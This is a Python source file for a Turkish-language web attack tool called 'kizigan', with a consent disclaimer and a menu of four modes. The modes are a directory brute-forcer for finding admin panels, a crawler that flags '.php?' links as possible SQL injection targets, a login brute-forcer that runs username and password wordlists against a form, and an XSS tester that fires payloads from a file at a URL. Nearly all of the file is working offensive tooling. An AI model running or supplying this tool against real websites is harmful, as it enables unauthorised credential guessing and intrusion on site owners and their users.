from colorama import Fore, init
import requests
import time
from bs4 import BeautifulSoup
from urllib.parse import urlencode
import re
from art import *

init(autoreset=True)
def xss(url, xssPayloadFile):
    try:
        with open(xssPayloadFile, 'r', encoding="utf-8") as file:
            payloads = file.readlines()
    except FileNotFoundError:
        print("Payload dosyası bulunamadı.")
        return

    try:
        for payload in payloads:
            payload = payload.strip() 
            url_with_payload = url + payload
            response = requests.get(url_with_payload)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, 'html.parser')
            if payload in soup.get_text():
                print(Fore.GREEN +"[+] Payload tespit edildi:", payload)
            else:
                print(Fore.RED +"[-] Payload tespit edilemedi:", payload)
    except requests.exceptions.RequestException as e:
        print(Fore.RED +"[!]Hata:", e)
    input("çıkış yapmak için 'q' tuşuna basınız")

def bruteForce(url, error_message,username_file, password_file, param1, param2):
    try:
        with open(username_file, 'r') as user_file:
            usernames = user_file.readlines()
        with open(password_file, 'r') as pass_file:
            passwords = pass_file.readlines()
    except FileNotFoundError:
        print("Dosya bulunamadı.")
        return
    
    for username in usernames:
        username = username.strip()
        for password in passwords:
            password = password.strip()
            data = {param1: username, param2: password}
            response = requests.post(url, data=data)
            soup = BeautifulSoup(response.content, 'html.parser')
            error_tag = soup.find(string=re.compile(error_message))
            if not error_tag: 
                print(Fore.GREEN + f"'{username,password}' parametresi için başarılı istek yapıldı.")
            else:
                print(Fore.RED + f"'{username,password}' parametresi için istek başarısız oldu.")
    input("Çıkmak için bir tuşa basınız...")


def sqlBul(url):
    response = requests.get(url)
    html_content = response.text
    soup = BeautifulSoup(html_content, 'html.parser')
    php_urls = re.findall(r'href=[\'"]?([^\'" >]+)', html_content)
    php_urls = [link for link in php_urls if ".php?" in link]
    for php_url in php_urls:
        print(Fore.GREEN+"[+] Bulunan Siteler" ,"=>", php_url)
    input("Çıkmak için bir tuşa basınız...")

def dizini_bul(url, hedef_dizinler, set_sleep):
    
    bulunan_dizinler = set()
    try:
        for dizin in hedef_dizinler:
            hedef = url + "/" + dizin
            response = requests.get(hedef)
            time.sleep(float(set_sleep))
            if response.status_code == 200 and hedef not in bulunan_dizinler:
                print(Fore.GREEN + "[+] Dizin bulundu =", hedef)
                bulunan_dizinler.add(hedef)
            elif response.status_code == 404 and hedef not in bulunan_dizinler:
                print(Fore.RED + "[!] 404 Hatası =", hedef)
                
            elif response.status_code == 302 and hedef not in bulunan_dizinler:
                print(Fore.BLUE + "[!] 302 Object moved temporarily =", hedef)
                
            elif response.status_code == 401 and hedef not in bulunan_dizinler:
                print(Fore.YELLOW + "[!] 401 Unauthorized =", hedef)
                
    except requests.exceptions as e:
        print("[!] Hata:", e)

    print("\nBulunan Dizinler Özeti:")
    for dizin in bulunan_dizinler:
        print("-", dizin)
    print("Toplam", len(bulunan_dizinler), "dizin bulundu.")
    input("Çıkmak için bir tuşa basınız...")

def main():
    
    tprint("kizigan", font="merlin1")
    print("Bu aracın kullanımı eğitim amaçlıdır. Verilen zararlardan kişi kendisi sorumludur.")
    sorumluluk = input("Yaptığım faaliyetlerden sorumlu olduğumu ve bu aracı yazan kişinin hiçbir sorumluluğu olmadığını kabul ediyorum. (E/H)")
    if sorumluluk == "E" or "e":
        print("""
    Seçenekler:
          1- Admin Panel Finder
          2- Possible SQL Injection Finder
          3- BruteForce
          4- XSS  
""")
    print("Seçeneklerden istediğinizi numarasını girerek seçiniz.")
    choice = input("Seçim: ")
    if choice == "1":
        tprint("admin finder", font="chunky")
        url = input(Fore.CYAN + "Lütfen taramak istediğiniz web sitesinin URL'sini girin: ")
        dosya_yolu = input(Fore.CYAN +"Lütfen dizinleri içeren metin dosyasının yolunu girin: ")
        set_sleep = input(Fore.CYAN +"Her istek arasında ne kadar beklemek istediğinizi belirtin: ")
        try:
            with open(dosya_yolu, 'r') as dosya:
                hedef_dizinler = dosya.read().splitlines()
                dizini_bul(url, hedef_dizinler, set_sleep)
        except FileNotFoundError:
            print(Fore.RED +"Belirtilen dosya bulunamadı.")
    elif choice == "2":
        tprint("Possible SQL \nInjection Finder", font="small" )
        url = input(Fore.BLUE + "Lütfen taramak istediğiniz web sitesinin URL'sini girin: ")
        sqlBul(url)
    elif choice == "3":
        tprint("BruteForce", font="speed" )
        url = input("Lütfen URL'yi girin: ")
        error_message = input("Lütfen hata mesajını girin (hata mesajı yoksa boş bırakın):")
        param1 = input("Birinci parametreyi girin (ör. username): ")
        param2 = input("İkinci parametreyi girin (ör. password): ")
        username_file = input("Kullanıcı adlarının bulunduğu dosyanın adını girin: ")
        password_file = input("Şifrelerin bulunduğu dosyanın adını girin: ")
        bruteForce(url, error_message,username_file, password_file, param1, param2)
    elif choice == "4":
        tprint("XSS", font="chiseled")
        url = input(Fore.YELLOW + "XSS payloadı denemek istediğiniz url adresini girin: ")
        xssPayloadFile = input( Fore.YELLOW +"XSS Payloadlarınızın bulunduğu txt dosyasının yolu: ")
        xss(url, xssPayloadFile)
        
    else:
        print("Programdan çıkış yapılıyor...")
    
if __name__ == "__main__":
    main()
